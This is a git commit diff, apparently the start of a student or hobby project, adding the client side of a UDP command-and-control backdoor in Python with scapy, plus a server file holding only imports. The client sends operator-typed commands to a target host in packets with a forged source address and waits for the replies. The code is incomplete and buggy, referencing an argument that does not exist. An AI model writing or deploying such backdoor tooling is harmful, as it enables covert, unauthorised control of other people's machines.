510642374bd952146c396533a862adccad47446d
Nishan <nishan@vivek.tech>
2017-10-26 12:15:10 -0700

    Initial Commits

---
+++ client.py
@@ -0,0 +1,31 @@
+import argparse
+from scapy.all import *
+from Crypto.Cipher import AES
+from scapy.layers.inet import IP, UDP
+
+
+#Argparse setup
+parser = argparse.ArgumentParser(description="Backdoor")
+parser.add_argument('-d', '--dest', dest='dest', help='Destination IP', required=True)
+parser.add_argument('-p', '--port', dest='port', help='Destination Port', required=True)
+parser.add_argument('-s', '-source', dest='source_ip', help='Source IP', required=True)
+parser.add_argument('-sp', '-source_port', dest='source_port', help='Source Port', required= True)
+args = parser.parse_args()
+
+
+def stp_filter(packet):
+        print packet['Raw'].load
+        return True
+
+
+
+def main():
+
+
+#Main command and display loop
+    while 1:
+            command = raw_input("Command to send:") + "#" + args.source
+            packet = IP(dst=args.dest, src=args.source)/UDP(sport=8081, dport=int(args.port))/command
+            send(packet)
+            sniff(filter="udp and src port " + args.port + " and dst port 8081", stop_filter=stp_filter)
+
---
+++ server.py
@@ -0,0 +1,4 @@
+import argparse
+from scapy.all import *
+from Crypto.Cipher import AES
+from scapy.layers.inet import IP, UDP
